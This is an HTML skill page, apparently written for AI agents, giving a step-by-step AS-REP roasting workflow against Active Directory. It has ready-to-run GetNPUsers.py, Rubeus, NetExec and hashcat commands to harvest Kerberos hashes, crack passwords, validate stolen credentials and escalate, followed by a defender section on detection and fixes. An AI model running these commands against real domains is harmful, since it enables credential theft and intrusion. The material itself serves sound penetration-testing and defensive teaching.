@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: asreproasting</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>asreproasting</h2><div class="meta"><span class="badge gray">ad</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">100/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when testing Active Directory for AS-REP roasting on an</p><div class="deps"><span class="kind">requires:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="ad-enumeration.html">ad-enumeration</a> <a href="password-attacks.html">password-attacks</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>impacket</td><td>0.12.0</td></tr><tr><td>Rubeus</td><td>2.x</td></tr><tr><td>hashcat</td><td>6.2.6</td></tr><tr><td>NetExec</td><td>1.4.0</td></tr><tr><td>John the Ripper</td><td>1.9.0-jumbo-1</td></tr></tbody></table><p>AS-REP roasting abuses accounts that have Kerberos preauthentication disabled. Normally a client must prove it knows the password before the domain controller answers an authentication request. When the DONT_REQUIRE_PREAUTH flag is set on an account, anyone can ask the KDC for an AS-REP message for that account, and part of that reply is encrypted with the account&#x27;s password hash. The reply can be cracked offline, so a weak password on one of these accounts becomes a set of working domain credentials. This skill covers the full authorized workflow for Active Directory assessments, lab environments, and CTFs only: finding the vulnerable accounts, requesting the AS-REP data with and without credentials, cracking it offline, and using the recovered passwords.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Build or obtain a list of domain usernames from enumeration, OSINT, or</li>
+<p>the ad-enumeration skill.</p>
+<li>Find accounts with preauthentication disabled using LDAP filters,</li>
+<p>PowerView, or NetExec.</p>
+<li>Request AS-REP responses for those accounts with GetNPUsers.py (no</li>
+<p>credentials needed) or Rubeus (from a Windows host).</p>
+<li>Save the responses in hashcat format and move them to the cracking box.</li>
+<li>Crack with hashcat mode 18200, starting with rockyou and rules, then</li>
+<p>targeted masks.</p>
+<li>Validate each cracked password immediately against SMB or LDAP, one at</li>
+<p>a time, watching the lockout policy.</p>
+<li>Check the new accounts for group membership, SPNs, and delegation to</li>
+<p>plan the next step.</p>
+<li>Record the account, hash type, crack time, and password strength for the</li>
+<p>report.</p>
+</ol>
+<h2>1. Find accounts with preauthentication disabled</h2>
+<p>The flag is bit 0x400000 (4194304) in the userAccountControl attribute. Querying for it needs either valid credentials or, in some setups, no credentials at all.</p>
+<pre><code class="language-bash"># LDAP search for accounts with DONT_REQUIRE_PREAUTH set
+ldapsearch -x -H ldap://10.10.10.10 -D &#x27;svcuser@corp.local&#x27; -w &#x27;Password1&#x27; \
+  -b &#x27;DC=corp,DC=local&#x27; \
+  &#x27;(&amp;(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))&#x27; \
+  sAMAccountName userPrincipalName userAccountControl</code></pre>
+<pre><code class="language-bash"># NetExec checks the flag while enumerating users
+nxc ldap 10.10.10.10 -u svcuser -p &#x27;Password1&#x27; --users | grep -i preauth</code></pre>
+<p>On a Windows host with PowerView loaded, the dedicated switch does the same job:</p>
+<pre><code class="language-powershell"># List every account that does not require preauthentication
+Get-DomainUser -PreauthNotRequired | Select-Object samaccountname, userprincipalname</code></pre>
+<p>If you have no credentials yet, skip this phase. GetNPUsers.py can test candidate usernames directly, so a username list is enough to start.</p>
+<h2>2. Request AS-REP responses</h2>
+<p>GetNPUsers.py sends the preauthentication-less AS request and saves the reply in a crackable format. It works without any credentials when you supply a username list.</p>
+<pre><code class="language-bash"># No credentials: try every name in users.txt, save hashcat format hashes
+GetNPUsers.py -dc-ip 10.10.10.10 corp.local/ -usersfile users.txt \
+  -no-pass -format hashcat -outputfile asrep.hashes
+
+# With credentials: request AS-REP data for ALL users at once
+GetNPUsers.py -dc-ip 10.10.10.10 corp.local/svcuser:Password1 \
+  -request -format hashcat -outputfile asrep.hashes
+
+# John the Ripper format instead of hashcat format
+GetNPUsers.py -dc-ip 10.10.10.10 corp.local/ -usersfile users.txt \
+  -no-pass -format john -outputfile asrep.john</code></pre>
+<p>NetExec can do the same over LDAP when you hold credentials:</p>
+<pre><code class="language-bash"># Dump AS-REP roastable hashes for every vulnerable account
+nxc ldap 10.10.10.10 -u svcuser -p &#x27;Password1&#x27; --asreproast asrep.hashes</code></pre>
+<p>From a Windows host, Rubeus performs the same request without Python:</p>
+<pre><code class="language-powershell"># Harvest AS-REP responses for all users with preauth disabled
+Rubeus.exe asreproast /nowrap /format:hashcat /outfile:C:\temp\asrep.hashes</code></pre>
+<p>A line in the output file that starts with <code>$krb5asrep$23$</code> (hashcat) or <code>$krb5asrep$</code> (john) is a successful capture. Accounts that fail return a KDC error instead, which tells you the flag was not really set.</p>
+<h2>3. Crack the hashes offline</h2>
+<p>Move the hash file to the cracking box. Nothing after this point touches the domain, so you can crack as aggressively as your hardware allows.</p>
+<pre><code class="language-bash"># hashcat mode 18200: Kerberos 5 AS-REP etype 23
+hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt --force
+
+# Add rules after the straight dictionary run
+hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt \
+  -r /usr/share/hashcat/rules/best64.rule --force
+
+# Targeted mask attack for common corporate patterns (SeasonYear, etc.)
+hashcat -m 18200 asrep.hashes -a 3 &#x27;?u?l?l?l?l?l202?d&#x27; --force</code></pre>
+<pre><code class="language-bash"># John the Ripper alternative
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep asrep.john
+john --show --format=krb5asrep asrep.john</code></pre>
+<p>Crack results print as <code>username:password</code>. AS-REP hashes are salted with the username, so each account needs its own cracking run, but one good wordlist usually covers all of them in a single hashcat session.</p>
+<h2>4. Validate and use the cracked credentials</h2>
+<p>Test each recovered password carefully. Authentication attempts can lock accounts, so check the lockout threshold from the domain policy first and test one account at a time.</p>
+<pre><code class="language-bash"># Test one credential pair against SMB (shows [+] on success)
+nxc smb 10.10.10.10 -u crackeduser -p &#x27;CrackedPass1&#x27;
+
+# Confirm the same pair against LDAP too
+nxc ldap 10.10.10.10 -u crackeduser -p &#x27;CrackedPass1&#x27;</code></pre>
+<pre><code class="language-bash"># Quick credential check without a full module run
+crackmapexec-legacy 2&gt;/dev/null; nxc smb 10.10.10.10 \
+  -u crackeduser -p &#x27;CrackedPass1&#x27; --local-auth 2&gt;&amp;1 | head -3</code></pre>
+<p>Once a password works, immediately enumerate what the account can do:</p>
+<pre><code class="language-bash"># Groups, SPNs, and delegation flags for the new account
+nxc ldap 10.10.10.10 -u crackeduser -p &#x27;CrackedPass1&#x27; --users | grep -i crackeduser
+GetUserSPNs.py -dc-ip 10.10.10.10 corp.local/crackeduser:&#x27;CrackedPass1&#x27;</code></pre>
+<h2>5. Turn the foothold into an attack path</h2>
+<p>A cracked AS-REP account is often a low privilege user, but it still unlocks the rest of the methodology. Feed the account into BloodHound collection to see its paths to Domain Admins, check whether it is itself Kerberoastable, and look at its group memberships for delegation or admin rights on other machines. If the account has an SPN, Kerberoast it next. If it has interesting ACLs, the bloodhound-methodology skill shows how to turn edges like GenericAll or ForceChangePassword into action.</p>
+<h2>Edge cases</h2>
+<ul>
+<li>GetNPUsers.py with <code>-no-pass</code> returns KDC_ERR_C_PRINCIPAL_UNKNOWN for</li>
+<p>names that do not exist. Those are failed guesses, not vulnerable accounts. Only <code>$krb5asrep$</code> lines count.</p>
+<li>An account flagged by LDAP but failing the AS request usually has the</li>
+<p>flag set on a stale or disabled object, or the domain requires preauth through policy anyway. Move on to the next name.</p>
+<li>Clock skew breaks Kerberos requests. If every request fails with</li>
+<p>KRB_AP_ERR_SKEW, sync the attacking box clock with the DC using ntpdate or chrony before retrying.</p>
+<li>IPv6 or DNS issues make the KDC unreachable by name. Always pass the DC</li>
+<p>by IP with <code>-dc-ip</code> and add a hosts entry for the domain if needed.</p>
+<li>Rubeus needs the <code>/nowrap</code> flag, otherwise the hash wraps across lines</li>
+<p>and hashcat rejects it.</p>
+<li>hashcat reports &quot;no hashes loaded&quot; when the file has john format hashes.</li>
+<p>Match the format to the tool: <code>-m 18200</code> needs <code>$krb5asrep$23$</code> lines.</p>
+<li>Usernames with special characters (accents, spaces) can break</li>
+<p>GetNPUsers.py parsing. Quote them in the users file and fall back to requesting with credentials and <code>-request</code> instead.</p>
+<li>Some environments rate limit AS requests. Space requests out and prefer</li>
+<p>the single <code>-request</code> run with credentials over thousands of individual no-auth requests.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>No credentials and no username list: harvest usernames first with</li>
+<p>kerbrute user enumeration or the ad-enumeration skill, then feed the list to GetNPUsers.py.</p>
+<li>GetNPUsers.py fails over UDP: force TCP with the <code>-tcp</code> flag if the</li>
+<p>version supports it, or tunnel through proxychains.</p>
+<li>Cracking stalls on every hash: prioritize. Accounts whose descriptions</li>
+<p>mention admin, backup, or service roles are worth mask attacks with company specific patterns (company name, seasons, years).</p>
+<li>Password recovered but account is disabled: check whether the hash</li>
+<p>belongs to a different enabled account with the same password, which happens when passwords are reused.</p>
+<li>Domain functional level blocks the attack entirely: fall back to</li>
+<p>password spraying with the username list (password-attacks skill), respecting the lockout policy.</p>
+<li>You cracked a password but the account has no useful rights: use it as</li>
+<p>the credential for BloodHound collection, since any authenticated user can collect the domain graph.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see AS-REP roasting as a burst of Event ID 4768 (Kerberos authentication service request) from a single source, where the requests carry no preauthentication data and many target accounts that do not normally log on from that host. Honeypot accounts with preauthentication disabled catch this reliably, because no legitimate process should ever request AS-REP data for them. The durable fixes are: enable Kerberos preauthentication on every account (clear the DONT_REQUIRE_PREAUTH flag), set long random passwords on any account that must keep the flag for legacy reasons, and alert on 4768 events without preauthentication from unexpected sources. Removing the flag is a one line change and breaks nothing modern.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1558.004 (Steal or Forge Kerberos Tickets: AS-REP</li>
+<p>Roasting).</p>
+<li>Impacket GetNPUsers.py documentation:</li>
+<p>https://github.com/fortra/impacket/tree/master/examples</p>
+<li>hashcat mode 18200 (Kerberos 5 AS-REP etype 23):</li>
+<p>https://hashcat.net/wiki/doku.php?id=example_hashes</p>
+<li>Rubeus documentation:</li>
+<p>https://github.com/GhostPack/Rubeus</p>
+<li>Microsoft documentation on Kerberos preauthentication and</li>
+<p>userAccountControl flags.</p>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
